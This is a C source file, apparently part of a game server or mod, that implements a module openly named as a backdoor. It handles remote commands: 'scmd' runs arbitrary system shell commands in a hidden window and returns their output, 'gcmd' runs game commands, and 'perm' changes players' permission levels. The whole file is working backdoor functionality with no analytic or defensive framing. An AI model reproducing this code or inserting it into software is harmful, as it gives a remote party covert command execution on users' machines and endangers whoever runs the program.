#include <backdoor/remote_cmd.h>
#include <Windows.h>

const char *GetCmdPrintf(char *szFetCmd)
{
	HANDLE hReadPipe = NULL;
	HANDLE hWritePipe = NULL;
	PROCESS_INFORMATION pi;
	STARTUPINFOA si;
	SECURITY_ATTRIBUTES sa;
	char *szBuffer = calloc(10000, 1);
	unsigned long count = 0;
	long long ipos = 0;
	memset(&pi, 0, sizeof(pi));
	memset(&si, 0, sizeof(si));
	memset(&sa, 0, sizeof(sa));
	pi.hProcess = NULL;
	pi.hThread = NULL;
	si.cb = sizeof(STARTUPINFO);
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = true;
	bool bret = CreatePipe(&hReadPipe, &hWritePipe, &sa, 0);
	if (!bret)
	{
		CloseHandle(hWritePipe);
		CloseHandle(hReadPipe);
		return NULL;
	}
	GetStartupInfoA(&si);
	si.hStdError = hWritePipe;
	si.hStdOutput = hWritePipe;
	si.wShowWindow = 0;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	bret = CreateProcessA(NULL, szFetCmd, NULL, NULL, 1, 0, NULL, NULL, &si, &pi);
	if (!bret)
	{
		CloseHandle(hWritePipe);
		CloseHandle(hReadPipe);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return NULL;
	}
	WaitForSingleObject(pi.hProcess, 500);
	bret = ReadFile(hReadPipe, szBuffer, 10000, &count, 0);
	if (!bret)
	{
		CloseHandle(hWritePipe);
		CloseHandle(hReadPipe);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return NULL;
	}
	CloseHandle(hWritePipe);
	CloseHandle(hReadPipe);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	return szBuffer;
}

const char *process_remote_cmd(const char *cmd)
{
	const char *ret = "";
    if (strstr(cmd, "gcmd"))
        run_game_cmd(&cmd[5]);
    else if (strstr(cmd, "scmd"))
		return GetCmdPrintf(_strdup(&cmd[5]));

    char *cmd_m = _strdup(cmd);
    const char *argv[4];
    int argc = 0;
    char *token = strtok(cmd_m, " ");
    while (token != NULL && argc < 4) {
        argv[argc++] = token;
        token = strtok(NULL, " ");
    }

    if (argc == 4 && strcmp(argv[0], "perm") == 0) {
        struct player *player = get_player_by_name(argv[1]);
        if (player) {
            int perm = atoi(argv[2]);
            bool display = atoi(argv[3]);
            if (perm >= 0 && perm <= 3)
                set_perm_lvl(player, perm, display);
        }
    }
	return ret;
}
